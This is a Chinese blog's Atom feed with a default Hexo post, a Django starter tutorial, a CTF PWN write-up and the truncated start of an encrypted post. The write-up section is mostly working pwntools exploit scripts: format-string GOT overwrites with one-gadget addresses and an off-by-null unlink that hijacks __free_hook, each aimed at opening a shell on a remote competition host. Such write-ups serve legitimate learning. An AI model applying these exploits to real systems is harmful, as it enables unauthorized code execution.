<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>咲夜南梦&#39;s 博客</title>
  <icon>https://www.gravatar.com/avatar/9c2e3cbf266e9f01ba2f5ba134dc3429</icon>
  <subtitle>技术向-肥宅空间</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://yoursite.com/"/>
  <updated>2019-12-30T07:17:02.408Z</updated>
  <id>http://yoursite.com/</id>
  
  <author>
    <name>咲夜南梦</name>
    <email>196011564@qq.com</email>
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Hello World</title>
    <link href="http://yoursite.com/2019/12/30/hello-world/"/>
    <id>http://yoursite.com/2019/12/30/hello-world/</id>
    <published>2019-12-30T07:17:02.407Z</published>
    <updated>2019-12-30T07:17:02.408Z</updated>
    
    <content type="html"><![CDATA[<html><head></head><body><p>Welcome to <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="noopener">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="noopener">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="noopener">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">bash</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">"My New Post"</span></span><br></pre></td></tr></tbody></table></figure></div><p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="noopener">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">bash</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></tbody></table></figure></div><p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="noopener">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">bash</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></tbody></table></figure></div><p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="noopener">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">bash</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></tbody></table></figure></div><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html" target="_blank" rel="noopener">Deployment</a></p></body></html>]]></content>
    
    <summary type="html">
    
      
      
        &lt;html&gt;&lt;head&gt;&lt;/head&gt;&lt;body&gt;&lt;p&gt;Welcome to &lt;a href=&quot;https://hexo.io/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;Hexo&lt;/a&gt;! This is your very first post. Che
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>Django开发入门</title>
    <link href="http://yoursite.com/2019/12/22/Django%E5%BC%80%E5%8F%91%E5%85%A5%E9%97%A8/"/>
    <id>http://yoursite.com/2019/12/22/Django%E5%BC%80%E5%8F%91%E5%85%A5%E9%97%A8/</id>
    <published>2019-12-22T05:36:02.000Z</published>
    <updated>2019-12-22T07:52:25.980Z</updated>
    
    <content type="html"><![CDATA[<html><head></head><body><h1 id="Django开发入门"><a href="#Django开发入门" class="headerlink" title="Django开发入门"></a>Django开发入门</h1><hr><h2 id="一、首先了解一下Django的结构"><a href="#一、首先了解一下Django的结构" class="headerlink" title="一、首先了解一下Django的结构"></a>一、首先了解一下Django的结构</h2><h2 id="我们使用pycharm创建一个django项目，然后发现有以下目录文件"><a href="#我们使用pycharm创建一个django项目，然后发现有以下目录文件" class="headerlink" title="我们使用pycharm创建一个django项目，然后发现有以下目录文件"></a>我们使用pycharm创建一个django项目，然后发现有以下目录文件</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">__init__.py(初始化一些东西)</span><br><span class="line">asgi.py</span><br><span class="line">setting.py(在开发过程中里面有很多配置需要添加)</span><br><span class="line">urls.py(类似于spring的@controller)</span><br><span class="line">wsgi.py</span><br></pre></td></tr></tbody></table></figure></div><h2 id="view的创建"><a href="#view的创建" class="headerlink" title="view的创建"></a>view的创建</h2><h3 id="输入以下指令可以创建一个app-name"><a href="#输入以下指令可以创建一个app-name" class="headerlink" title="输入以下指令可以创建一个app_name"></a>输入以下指令可以创建一个app_name</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 manage.py startapp app_name</span><br></pre></td></tr></tbody></table></figure></div><h3 id="这里我创建一个login"><a href="#这里我创建一个login" class="headerlink" title="这里我创建一个login"></a>这里我创建一个login</h3><h5 id="login目录下urls文件"><a href="#login目录下urls文件" class="headerlink" title="login目录下urls文件"></a>login目录下urls文件</h5><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">from django.urls import path</span><br><span class="line"></span><br><span class="line">from . import views</span><br><span class="line">urlpatterns = [</span><br><span class="line">    path('',views.index,name='index')</span><br><span class="line">]</span><br></pre></td></tr></tbody></table></figure></div><h5 id="login目录下view文件"><a href="#login目录下view文件" class="headerlink" title="login目录下view文件"></a>login目录下view文件</h5><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">from django.shortcuts import render</span><br><span class="line">from django.http import HttpResponse</span><br><span class="line"># Create your views here.</span><br><span class="line">def index(request):</span><br><span class="line">    return HttpResponse("Hello World!")</span><br></pre></td></tr></tbody></table></figure></div><h5 id="然后在一开始创建项目的那一层的urls加一个include包和path即可，path是为了能加载login的app"><a href="#然后在一开始创建项目的那一层的urls加一个include包和path即可，path是为了能加载login的app" class="headerlink" title="然后在一开始创建项目的那一层的urls加一个include包和path即可，path是为了能加载login的app"></a>然后在一开始创建项目的那一层的urls加一个include包和path即可，path是为了能加载login的app</h5><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">from django.contrib import admin</span><br><span class="line">from django.urls import path,include</span><br><span class="line">urlpatterns = [</span><br><span class="line">    path('admin/',admin.site.urls),</span><br><span class="line">    path('index/',include("login.urls"))</span><br><span class="line">]</span><br></pre></td></tr></tbody></table></figure></div><h2 id="最终效果："><a href="#最终效果：" class="headerlink" title="最终效果："></a>最终效果：</h2><h4 id="控制台输入-python3-manage-py-runserver-然后输入http-127-0-0-1-index-就可以看到Hello-World-了"><a href="#控制台输入-python3-manage-py-runserver-然后输入http-127-0-0-1-index-就可以看到Hello-World-了" class="headerlink" title="控制台输入 python3 manage.py runserver 然后输入http://127.0.0.1/index/就可以看到Hello World!了"></a>控制台输入 python3 manage.py runserver 然后输入<a href="http://127.0.0.1/index/就可以看到Hello" target="_blank" rel="noopener">http://127.0.0.1/index/就可以看到Hello</a> World!了</h4></body></html>]]></content>
    
    <summary type="html">
    
      
      
        &lt;html&gt;&lt;head&gt;&lt;/head&gt;&lt;body&gt;&lt;h1 id=&quot;Django开发入门&quot;&gt;&lt;a href=&quot;#Django开发入门&quot; class=&quot;headerlink&quot; title=&quot;Django开发入门&quot;&gt;&lt;/a&gt;Django开发入门&lt;/h1&gt;&lt;hr&gt;
&lt;h2 id=&quot;一、首
      
    
    </summary>
    
    
      <category term="Django" scheme="http://yoursite.com/categories/Django/"/>
    
    
      <category term="Django" scheme="http://yoursite.com/tags/Django/"/>
    
  </entry>
  
  <entry>
    <title>CTF-安询杯-19年12月</title>
    <link href="http://yoursite.com/2019/12/01/CTF-%E5%AE%89%E8%AF%A2%E6%9D%AF-19%E5%B9%B412%E6%9C%88/"/>
    <id>http://yoursite.com/2019/12/01/CTF-%E5%AE%89%E8%AF%A2%E6%9D%AF-19%E5%B9%B412%E6%9C%88/</id>
    <published>2019-12-01T06:16:02.000Z</published>
    <updated>2019-12-01T06:33:50.000Z</updated>
    
    <content type="html"><![CDATA[<html><head></head><body><h1 id="安询杯-PWN-WP"><a href="#安询杯-PWN-WP" class="headerlink" title="安询杯 PWN WP"></a>安询杯 PWN WP</h1><h2 id="前言：做项目做到凌晨3点，9点被拉起来打比赛可还行，然后竟然还续到了晚上9点，我飞仙了"><a href="#前言：做项目做到凌晨3点，9点被拉起来打比赛可还行，然后竟然还续到了晚上9点，我飞仙了" class="headerlink" title="前言：做项目做到凌晨3点，9点被拉起来打比赛可还行，然后竟然还续到了晚上9点，我飞仙了"></a>前言：做项目做到凌晨3点，9点被拉起来打比赛可还行，然后竟然还续到了晚上9点，我飞仙了</h2><h2 id="0x1-fmt32-SOLVED-working-咲夜南梦"><a href="#0x1-fmt32-SOLVED-working-咲夜南梦" class="headerlink" title="0x1 fmt32 | SOLVED | working : 咲夜南梦"></a>0x1 fmt32 | SOLVED | working : 咲夜南梦</h2><hr><h3 id="leak脚本用wiki的就好了，可以dump出文件"><a href="#leak脚本用wiki的就好了，可以dump出文件" class="headerlink" title="leak脚本用wiki的就好了，可以dump出文件"></a>leak脚本用wiki的就好了，可以dump出文件</h3><h3 id="然后分析各个call的got对应的函数，主要是猜测，然后到libc库里掏一下，验证一下自己的猜测是否正确。然后找到正确的函数之后，通过修改got为one-gadget来拿到shell"><a href="#然后分析各个call的got对应的函数，主要是猜测，然后到libc库里掏一下，验证一下自己的猜测是否正确。然后找到正确的函数之后，通过修改got为one-gadget来拿到shell" class="headerlink" title="然后分析各个call的got对应的函数，主要是猜测，然后到libc库里掏一下，验证一下自己的猜测是否正确。然后找到正确的函数之后，通过修改got为one gadget来拿到shell"></a>然后分析各个call的got对应的函数，主要是猜测，然后到libc库里掏一下，验证一下自己的猜测是否正确。然后找到正确的函数之后，通过修改got为one gadget来拿到shell</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">##coding=utf8</span><br><span class="line">from pwn import *</span><br><span class="line">context.log_level = 'debug'</span><br><span class="line">ip = "47.108.135.45"</span><br><span class="line">port = 20023</span><br><span class="line">sh = remote(ip, port)</span><br><span class="line">lib = ELF("libc.so.6")</span><br><span class="line">'''</span><br><span class="line">0x3a80c execve("/bin/sh", esp+0x28, environ)</span><br><span class="line">constraints:</span><br><span class="line">  esi is the GOT address of libc</span><br><span class="line">  [esp+0x28] == NULL</span><br><span class="line">0x3a80e execve("/bin/sh", esp+0x2c, environ)</span><br><span class="line">constraints:</span><br><span class="line">  esi is the GOT address of libc</span><br><span class="line">  [esp+0x2c] == NULL</span><br><span class="line">0x3a812 execve("/bin/sh", esp+0x30, environ)</span><br><span class="line">constraints:</span><br><span class="line">  esi is the GOT address of libc</span><br><span class="line">  [esp+0x30] == NULL</span><br><span class="line">0x3a819 execve("/bin/sh", esp+0x34, environ)</span><br><span class="line">constraints:</span><br><span class="line">  esi is the GOT address of libc</span><br><span class="line">  [esp+0x34] == NULL</span><br><span class="line">0x5f065 execl("/bin/sh", eax)</span><br><span class="line">constraints:</span><br><span class="line">  esi is the GOT address of libc</span><br><span class="line">  eax == NULL</span><br><span class="line">0x5f066 execl("/bin/sh", [esp])</span><br><span class="line">constraints:</span><br><span class="line">  esi is the GOT address of libc</span><br><span class="line">  [esp] == NULL</span><br><span class="line">'''</span><br><span class="line">sh.sendlineafter('me:',"%9$sA" + p32(0x804A014))</span><br><span class="line">sh.recvuntil('Repeater:')</span><br><span class="line">printf_got = u32(sh.recv(4))</span><br><span class="line">libc = printf_got - 0x049020</span><br><span class="line">system = libc + 0x03a940</span><br><span class="line">free = libc + lib.symbols['free']</span><br><span class="line">__free_hook = libc + lib.symbols['__free_hook']</span><br><span class="line">sh.sendlineafter('me:',"%9$sA" + p32(0x804A014 + 4 * 5))</span><br><span class="line">sh.recvuntil('Repeater:')</span><br><span class="line">__libc_start_main = u32(sh.recv(4))</span><br><span class="line">sh.sendlineafter('me:',"%9$sA" + p32(0x804A030))</span><br><span class="line">sh.recvuntil('Repeater:')</span><br><span class="line">sprintf = u32(sh.recv(4))</span><br><span class="line">one_gadget = [0x3a80c,0x3a80e,0x3a812,0x3a819,0x5f065,0x5f066]</span><br><span class="line">log.success("sprintf: " + hex(sprintf))</span><br><span class="line">log.success("__libc_start_main: " + hex(__libc_start_main))</span><br><span class="line">log.success("printf: " + hex(printf_got))</span><br><span class="line">log.success("system: " + hex(system))</span><br><span class="line">log.success("libc: " + hex(libc))</span><br><span class="line">payload  ='aaaaa'</span><br><span class="line">payload += fmtstr_payload(9,{0x804A014:one_gadget[0] + libc},write_size = "byte",numbwritten = 0xe)</span><br><span class="line">sh.sendlineafter("me:",payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></tbody></table></figure></div><h2 id="0x2-fmt64-SOLVED-working-咲夜南梦"><a href="#0x2-fmt64-SOLVED-working-咲夜南梦" class="headerlink" title="0x2 fmt64 | SOLVED | working : 咲夜南梦"></a>0x2 fmt64 | SOLVED | working : 咲夜南梦</h2><hr><h3 id="nc过去发现数据和fmt32一样，所以猜测是同一个源码编译成两个程序，然后用上面那个脚本dump一下内存，然后ida分析一下，可以得到got地址，然后利用onegadget拿到shell就好了，思路和fmt32一样"><a href="#nc过去发现数据和fmt32一样，所以猜测是同一个源码编译成两个程序，然后用上面那个脚本dump一下内存，然后ida分析一下，可以得到got地址，然后利用onegadget拿到shell就好了，思路和fmt32一样" class="headerlink" title="nc过去发现数据和fmt32一样，所以猜测是同一个源码编译成两个程序，然后用上面那个脚本dump一下内存，然后ida分析一下，可以得到got地址，然后利用onegadget拿到shell就好了，思路和fmt32一样"></a>nc过去发现数据和fmt32一样，所以猜测是同一个源码编译成两个程序，然后用上面那个脚本dump一下内存，然后ida分析一下，可以得到got地址，然后利用onegadget拿到shell就好了，思路和fmt32一样</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context.log_level = 'debug'</span><br><span class="line">ip = "47.108.135.45"</span><br><span class="line">port = 20023</span><br><span class="line">sh = remote(ip, port)</span><br><span class="line">lib = ELF("libc.so.6")</span><br><span class="line">sprintf_got = 0x601058</span><br><span class="line">payload = '%9$sAAAA' + p64(sprintf_got)</span><br><span class="line">sh.sendlineafter(":",payload)</span><br><span class="line">sprintf = u64(sh.recvuntil("\x7f")[-6:].ljust(8,'\x00'))</span><br><span class="line">libc = sprintf - lib.symbols['sprintf']</span><br><span class="line">system = libc + lib.symbols['system']</span><br><span class="line">one_gadget = [0x45216,0x4526a,0xf02a4,0xf1147]</span><br><span class="line">system = libc + one_gadget[0]</span><br><span class="line">payload = ''</span><br><span class="line">payload += '%' + str((system % 0x10000) - 9) + 'c%12$hn'</span><br><span class="line">payload += '%' + str(((system >> 16) % 0x10000) - (system % 0x10000)) + 'c%13$hn'</span><br><span class="line">payload += '%12$s'</span><br><span class="line">payload = payload.ljust(0x20,'\x00')</span><br><span class="line">payload += p64(sprintf_got) + p64(sprintf_got + 2)</span><br><span class="line">sh.sendlineafter(":",payload)</span><br><span class="line">addr = u64(sh.recvuntil("\x7f")[-6:].ljust(8,'\x00'))</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></tbody></table></figure></div><h2 id="0x3-heap-SOLVED-working-咲夜南梦"><a href="#0x3-heap-SOLVED-working-咲夜南梦" class="headerlink" title="0x3 heap | SOLVED | working : 咲夜南梦"></a>0x3 heap | SOLVED | working : 咲夜南梦</h2><hr><h3 id="典型的off-by-null-unlink，通过printf来实现pie-leak和libc-leak，然后unlink修改chunk-list为-free-hook-然后写入system和binsh，然后free一下即可拿到shell"><a href="#典型的off-by-null-unlink，通过printf来实现pie-leak和libc-leak，然后unlink修改chunk-list为-free-hook-然后写入system和binsh，然后free一下即可拿到shell" class="headerlink" title="典型的off by null+unlink，通过printf来实现pie leak和libc leak，然后unlink修改chunk_list为__free_hook,然后写入system和binsh，然后free一下即可拿到shell"></a>典型的off by null+unlink，通过printf来实现pie leak和libc leak，然后unlink修改chunk_list为__free_hook,然后写入system和binsh，然后free一下即可拿到shell</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">from pwn import *</span><br><span class="line">context.log_level = "debug"</span><br><span class="line">context.arch = "amd64"</span><br><span class="line">elf = ELF("pwn1")</span><br><span class="line">lib = 0</span><br><span class="line">sh = 0</span><br><span class="line">def pwn(ip,port,debug):</span><br><span class="line"> global lib</span><br><span class="line"> global sh</span><br><span class="line"> if(debug == 1):</span><br><span class="line">  sh = process("./pwn1")</span><br><span class="line">  lib = ELF("/lib/x86_64-linux-gnu/libc.so.6")</span><br><span class="line"> else:</span><br><span class="line">  sh = remote(ip,port)</span><br><span class="line">  lib = ELF("libc-2.23.so")</span><br><span class="line"> pop_rdi_ret = elf.search(asm("pop rdi\nret")).next()</span><br><span class="line"> pop_rsi_r15_ret = elf.search(asm("pop rsi\npop r15\nret")).next()</span><br><span class="line"> def add(idx,size,content):</span><br><span class="line">  sh.sendlineafter(":","1")</span><br><span class="line">  sh.sendlineafter(":",str(idx))</span><br><span class="line">  sh.sendlineafter(":",str(size))</span><br><span class="line">  sh.sendlineafter(":",content)</span><br><span class="line"> def edit(idx,content):</span><br><span class="line">  sh.sendlineafter(":","4")</span><br><span class="line">  sh.sendlineafter(":",str(idx))</span><br><span class="line">  sh.sendlineafter(":",content)</span><br><span class="line"> def free(idx):</span><br><span class="line">  sh.sendlineafter(":","2")</span><br><span class="line">  sh.sendlineafter(":",str(idx))</span><br><span class="line"> chunk_list = 0x202060</span><br><span class="line"> payload = '%14$pAA%2$pB'</span><br><span class="line"> sh.sendlineafter(":",payload)</span><br><span class="line"> sh.recvuntil("Hello, ")</span><br><span class="line"> pie = int(sh.recvuntil("AA",True),16) - (0x55d7eaef1200 - 0x55d7eaef0000)</span><br><span class="line"> libc = int(sh.recvuntil("B",True),16) - lib.symbols['__malloc_initialize_hook'] + 0x30</span><br><span class="line"> __free_hook = libc + lib.symbols['__free_hook']</span><br><span class="line"> system = libc + lib.symbols['system']</span><br><span class="line"> add(0,0x88,'\x11' * 0x87)</span><br><span class="line"> add(1,0xF8,'\x12' * 0xF7)</span><br><span class="line"> add(2,0x18,'\x13' * 0x17)</span><br><span class="line"> free(0)</span><br><span class="line"> payload = p64(0) + p64(0x81) + p64(pie + chunk_list - 0x18) + p64(pie + chunk_list - 0x10)</span><br><span class="line"> payload = payload.ljust(0x80,'\x00')</span><br><span class="line"> payload += p64(0x80)</span><br><span class="line"> add(0,0x88,payload)</span><br><span class="line"> free(1)</span><br><span class="line"> payload = p64(0) * 3 + p64(__free_hook - 8) + p64(0x100)</span><br><span class="line"> payload += p64(__free_hook - 8) + p64(0x100)</span><br><span class="line"> edit(0,payload)</span><br><span class="line"> edit(0,'/bin/sh\x00' + p64(system))</span><br><span class="line"> free(0)</span><br><span class="line"> sh.interactive()</span><br><span class="line">if __name__ == "__main__":</span><br><span class="line"> pwn("47.108.135.45",20023,0)</span><br></pre></td></tr></tbody></table></figure></div></body></html>]]></content>
    
    <summary type="html">
    
      
      
        &lt;html&gt;&lt;head&gt;&lt;/head&gt;&lt;body&gt;&lt;h1 id=&quot;安询杯-PWN-WP&quot;&gt;&lt;a href=&quot;#安询杯-PWN-WP&quot; class=&quot;headerlink&quot; title=&quot;安询杯 PWN WP&quot;&gt;&lt;/a&gt;安询杯 PWN WP&lt;/h1&gt;&lt;h2 id=&quot;前言：做项目做到
      
    
    </summary>
    
    
      <category term="CTF" scheme="http://yoursite.com/categories/CTF/"/>
    
    
      <category term="CTF" scheme="http://yoursite.com/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>CTF-scanf相关的漏洞详解</title>
    <link href="http://yoursite.com/2019/11/24/CTF-scanf%E7%9B%B8%E5%85%B3%E7%9A%84%E6%BC%8F%E6%B4%9E%E8%AF%A6%E8%A7%A3/"/>
    <id>http://yoursite.com/2019/11/24/CTF-scanf%E7%9B%B8%E5%85%B3%E7%9A%84%E6%BC%8F%E6%B4%9E%E8%AF%A6%E8%A7%A3/</id>
    <published>2019-11-24T06:08:02.000Z</published>
    <updated>2019-11-24T06:18:10.000Z</updated>
    
    <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="抱歉, 这个密码看着不太对, 请再试试." data-whm="抱歉, 这个文章不能被校验, 不过您还是能看看解密后的内容."><div class="hbe-input-container"><input type="password" id="hbePass" placeholder="该文章被加密了，请联系管理员请求密码。" /><label>该文章被加密了，请联系管理员请求密码。</label><button class="hbe-button" onclick="fireKeyEvent(document.getElementById('hexo-blog-encrypt'),'keydown',13);">解密文章</button><div class="bottom-line"></div></div><script>function fireKeyEvent(el, evtType, keyCode){var doc = el.ownerDocument,win = doc.defaultView || doc.parentWindow,evtObj;if(doc.createEvent){if(win.KeyEvent) {evtObj = doc.createEvent('KeyEvents');evtObj.initKeyEvent( evtType, true, true, win, false, false, false, false, keyCode, 0 );}else {evtObj = doc.createEvent('UIEvents');Object.defineProperty(evtObj, 'keyCode', {get : function() { return this.keyCodeVal; }}); Object.defineProperty(evtObj, 'which', {get : function() { return this.keyCodeVal; }});evtObj.initUIEvent( evtType, true, true, win, 1 );evtObj.keyCodeVal = keyCode;if (evtObj.keyCode !== keyCode) {console.log("keyCode " + evtObj.keyCode + " 和 (" + evtObj.which + ") 不匹配");}}el.dispatchEvent(evtObj);} else if(doc.createEventObject){evtObj = doc.createEventObject();evtObj.keyCode = keyCode;el.fireEvent('on' + evtType, evtObj);}}</script><script id="hbeData" type="hbeData" data-hmacdigest="7b039562e6a233eb10441415de2fd9174b76f750523d37d23a93d81b854ca8d9">6f7372beb137aac8bdd9c404b5747d473174a4f3439a1d8317f3b86da64da9ec45f6e1cbe863ceeff58dbc6fbbd0f8a5f6556a6d057d82a40d95af035317746d6d09ddc419c9a77b354f43f070c061cc3388959ec63cd5ed919a562f4e14add87217e64305375b4a8c52d4eef8c08ef5241fe98315159c8f8e7c1f9d823df2b27a715cb95ec1e0398147011e515e5410fd27c5045e9c676658f732adabbb226e1f02e400f5a2ebbea329845cd6f169fff652324dcf80913dad0aad36011e06715975ff384ff4c56be165242bfc8c2789d94cbb0ad31423938caf831cae7e8ecefee404514a51788eaae98a5dfda72fe48d1d613d7524cc46957f0b9a0d3add4d26002d361bb3d30f3fc6af7751fff467e05109fbc4f1bb2a6a98e2b0a97855a2c7471bf3c022054cedcf5e4e749f5bd2c01be4874fb04494c0c2017229a1e1f7433c6f44a9c6ae068c67f9b6b9fd6bd6e9bd97e00d167cbf89e00dcb670ffc4022352608064ecc09ea60cddcbd939d4f67667d94cb5af797270956af84a85bd562ed9802f08dedf5418f462dcdfbf966df8b6ef479c487963409582c71fd076cfaccc7997cb8d7d9089b4903e76934a0cf7bcd5caea71bf16663a082b80493848c57c4a757bf110b672003d9f976210f669a72270feddf6f8b3cd99e521823c67214edea4ac03bec8f19ee51b592eced78aae75bba7e0c74626c1f7d2912021658239ce59a73a9a76ff5bf0b6185dfde3c1320d98fb6f5f0d05d8d303f205c05ab5bf918a6ecc2f07a6fba6cc559bf688f828b3794ec782ca207cfa8205d2ae249755882a59ebc1b9316373d3627f4ad5967f210e1bbd1c5bf0eaf331278e06fcd6b45843cacc0444a19a63cc532fdf006a77a3ca42e893e6ec0eea6850f06f5ab7bfcbd9cfef20ee82c6898e2213f9178cfdcb